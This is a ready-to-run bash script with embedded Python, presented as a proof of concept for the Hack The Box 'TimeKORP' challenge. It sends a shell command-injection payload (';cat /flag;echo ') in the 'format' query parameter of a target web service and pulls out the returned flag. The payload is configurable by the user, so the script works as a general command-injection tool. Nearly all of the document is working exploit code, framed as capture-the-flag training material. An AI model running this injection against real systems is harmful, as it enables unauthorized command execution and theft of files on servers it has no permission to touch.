#!/usr/bin/env bash
set -euo pipefail

# -----------------------------------------------------------------------------
# PoC: Hack The Box - TimeKORP
# Type: Command Injection via unsanitized date format parameter
#
# This script is intended for authorized CTF infrastructure only.
# -----------------------------------------------------------------------------

readonly SCRIPT_NAME="$(basename "$0")"
readonly DEFAULT_TIMEOUT=15
readonly DEFAULT_PAYLOAD="';cat /flag;echo '"

HOST=""
PORT=""
TIMEOUT="${DEFAULT_TIMEOUT}"
PAYLOAD="${DEFAULT_PAYLOAD}"
JSON_OUTPUT=0
VERBOSE=0

usage() {
  cat <<EOF
Usage:
  ${SCRIPT_NAME} <host> <port>
  ${SCRIPT_NAME} --host <host> --port <port> [options]

Options:
  --host <host>         Target host or IP address
  --port <port>         Target TCP port
  --payload <value>     Injection payload for format parameter
  --timeout <seconds>   HTTP timeout in seconds (default: ${DEFAULT_TIMEOUT})
  --json                Print result as JSON
  --verbose             Enable verbose debug output
  -h, --help            Show this help message

Exit codes:
  0  Success (flag extracted)
  1  Generic failure
  2  Invalid arguments
  3  Connectivity/request failure
  4  Flag not found in response
EOF
}

log_info() {
  if [[ "${JSON_OUTPUT}" -eq 0 ]]; then
    printf '[*] %s\n' "$*" >&2
  fi
}

log_debug() {
  if [[ "${VERBOSE}" -eq 1 && "${JSON_OUTPUT}" -eq 0 ]]; then
    printf '[D] %s\n' "$*" >&2
  fi
}

log_ok() {
  if [[ "${JSON_OUTPUT}" -eq 0 ]]; then
    printf '[+] %s\n' "$*" >&2
  fi
}

log_error() {
  printf '[-] %s\n' "$*" >&2
}

parse_args() {
  local positional=()
  while [[ $# -gt 0 ]]; do
    case "$1" in
      --host)
        HOST="${2:-}"
        shift 2
        ;;
      --port)
        PORT="${2:-}"
        shift 2
        ;;
      --payload)
        PAYLOAD="${2:-}"
        shift 2
        ;;
      --timeout)
        TIMEOUT="${2:-}"
        shift 2
        ;;
      --json)
        JSON_OUTPUT=1
        shift
        ;;
      --verbose)
        VERBOSE=1
        shift
        ;;
      -h|--help)
        usage
        exit 0
        ;;
      -*)
        log_error "Unknown option: $1"
        usage >&2
        exit 2
        ;;
      *)
        positional+=("$1")
        shift
        ;;
    esac
  done

  if [[ -z "${HOST}" && ${#positional[@]} -ge 1 ]]; then
    HOST="${positional[0]}"
  fi
  if [[ -z "${PORT}" && ${#positional[@]} -ge 2 ]]; then
    PORT="${positional[1]}"
  fi

  if [[ -z "${HOST}" || -z "${PORT}" ]]; then
    log_error "Host and port are required."
    usage >&2
    exit 2
  fi
}

validate_input() {
  if ! [[ "${PORT}" =~ ^[0-9]+$ ]] || (( PORT < 1 || PORT > 65535 )); then
    log_error "Invalid port: ${PORT}"
    exit 2
  fi
}

main() {
  parse_args "$@"
  validate_input

  log_info "Target: http://${HOST}:${PORT}/"
  log_info "Sending format injection payload..."

  local result
  if ! result="$(python3 - "${HOST}" "${PORT}" "${PAYLOAD}" "${TIMEOUT}" "${VERBOSE}" <<'PY'
import re
import sys
import requests

host = sys.argv[1]
port = sys.argv[2]
payload = sys.argv[3]
timeout = float(sys.argv[4])
verbose = sys.argv[5] == "1"
base = f"http://{host}:{port}/"

try:
    r = requests.get(base, params={"format": payload}, timeout=timeout)
except requests.RequestException as exc:
    print(f"ERR_REQUEST:{exc}")
    raise SystemExit(3)

if verbose:
    print(f"DBG_STATUS:{r.status_code}")
    print(f"DBG_URL:{r.url}")

match = re.search(r"HTB\{[^}]+\}", r.text)
if not match:
    print("ERR_NOFLAG:Flag not found in response")
    if verbose:
        print(r.text[:1200])
    raise SystemExit(4)

print(f"OK_FLAG:{match.group(0)}")
PY
)"; then
    case "$?" in
      3) log_error "Request/connectivity failure."; exit 3 ;;
      4) log_error "Flag not found in response."; exit 4 ;;
      *) log_error "Unexpected runtime failure."; exit 1 ;;
    esac
  fi

  log_debug "Exploit output: ${result}"
  local flag
  flag="$(printf '%s\n' "${result}" | sed -n 's/^OK_FLAG://p' | tail -n 1)"
  if [[ -z "${flag}" ]]; then
    log_error "No flag extracted from output."
    exit 4
  fi

  if [[ "${JSON_OUTPUT}" -eq 1 ]]; then
    printf '{"target":"http://%s:%s/","payload":"%s","flag":"%s"}\n' "${HOST}" "${PORT}" "${PAYLOAD}" "${flag}"
  else
    log_ok "Flag extracted successfully."
    printf '%s\n' "${flag}"
  fi
}

main "$@"
